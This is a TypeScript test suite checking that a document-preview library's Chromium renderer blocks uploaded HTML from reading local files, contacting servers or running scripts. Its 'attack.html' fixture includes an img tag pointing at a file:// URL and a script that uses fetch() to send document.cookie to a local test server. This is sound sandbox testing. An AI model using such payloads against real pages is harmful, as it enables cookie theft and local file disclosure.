import assert from "node:assert/strict";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import test from "node:test";

import sharp from "sharp";

import { createQuicklook } from "../src/index.ts";

const quicklook = createQuicklook({ binaries: { ffmpeg: false, pdftocairo: false, pdftoppm: false, libreoffice: false } });

/** The colour at a point of a rendered preview. */
async function pixel(buffer: Buffer, x: number, y: number): Promise<[number, number, number]> {
  const { data, info } = await sharp(buffer).raw().toBuffer({ resolveWithObject: true });
  const at = (y * info.width + x) * info.channels;
  return [data[at]!, data[at + 1]!, data[at + 2]!];
}

async function fixture(context: test.TestContext) {
  if (!(await quicklook.getRuntimeCapabilities()).chromium.available) {
    context.skip("Chromium is not available in this environment.");
    return null;
  }
  const dir = await mkdtemp(join(tmpdir(), "quicklook-sandbox-"));
  // A red picture on disk, which a page must not be able to show, and a server it must not be able to reach.
  const red = join(dir, "secret.png");
  await sharp({ create: { width: 400, height: 400, channels: 3, background: "#ff0000" } }).png().toFile(red);
  const hits: string[] = [];
  const server = createServer((request, response) => {
    hits.push(request.url ?? "");
    response.writeHead(200, { "content-type": "image/png" });
    response.end();
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = (server.address() as { port: number }).port;
  context.after(async () => {
    server.close();
    await rm(dir, { recursive: true, force: true });
  });
  return { dir, red: pathToFileURL(red).href, origin: `http://127.0.0.1:${port}`, hits };
}

test("an uploaded page reads no file, reaches no address and runs no script", async (context) => {
  const env = await fixture(context);
  if (!env) return;
  const page = join(env.dir, "attack.html");
  await writeFile(
    page,
    `<!doctype html><html><body style="margin:0;background:#ffffff">
<img src="${env.red}" style="display:block;width:400px;height:400px">
<img src="${env.origin}/beacon.png">
<link rel="stylesheet" href="${env.origin}/style.css">
<iframe src="${env.red}"></iframe>
<script>document.body.style.background = "#00ff00"; fetch("${env.origin}/fetch?" + document.cookie);</script>
</body></html>`,
  );

  const result = await quicklook.generate({ path: page }, { size: { maxEdge: 1200 } });
  const [r, g, b] = await pixel(result.items[0]!.buffer, 50, 50);

  assert.deepEqual(env.hits, [], "no request reached the network");
  assert.ok(!(r > 200 && g < 60 && b < 60), "the file on disk was not shown");
  assert.ok(!(g > 200 && r < 60), "the page's script did not run");
});

test("a page the caller built itself runs its scripts, still with no file or network", async (context) => {
  const env = await fixture(context);
  if (!env) return;
  const page = join(env.dir, "artifact.html");
  await writeFile(
    page,
    `<!doctype html><html><body style="margin:0;background:#ffffff"><div id="root" style="width:400px;height:400px"></div>
<script>document.getElementById("root").style.background = "#00ff00"; fetch("${env.origin}/fetch");</script>
</body></html>`,
  );

  const result = await quicklook.generate({ path: page }, { size: { maxEdge: 1200 }, trustedHtmlScripts: true });
  const [r, g] = await pixel(result.items[0]!.buffer, 50, 50);

  assert.ok(g > 200 && r < 60, "the trusted script ran");
  assert.deepEqual(env.hits, [], "its request still did not leave");
});
